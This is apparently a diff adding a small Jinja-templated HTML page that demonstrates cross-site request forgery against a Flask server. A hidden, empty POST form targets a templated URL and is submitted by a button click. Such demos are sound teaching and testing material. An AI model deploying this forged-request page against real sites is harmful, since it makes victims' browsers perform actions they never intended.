@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Demonstration (Manual Trigger)</title>
+</head>
+<body style="font-family: Arial; padding: 20px;">
+
+    <h1>CSRF Demo – Manual Trigger</h1>
+
+    <p><strong>Target URL:</strong> {{ target_url }}</p>
+
+    <p>
+        This page demonstrates a CSRF attack.  
+        Click the button below to send a cross-site POST request to your Flask server.
+    </p>
+
+    <div id="status" style="margin-top: 20px; font-weight: bold;">
+        Waiting for user action...
+    </div>
+
+    <!-- Hidden CSRF form -->
+    <form id="csrfForm" action="{{ target_url }}" method="POST" style="display:none;">
+        <!-- No fields required -->
+    </form>
+
+    <button onclick="sendCSRF()" style="
+        padding: 10px 20px;
+        margin-top: 20px;
+        font-size: 16px;
+        cursor: pointer;
+    ">
+        Send CSRF Request
+    </button>
+
+    <script>
+        function sendCSRF() {
+            document.getElementById("status").innerText = "Sending CSRF request...";
+            document.getElementById("csrfForm").submit();
+        }
+    </script>
+
+</body>
+</html>
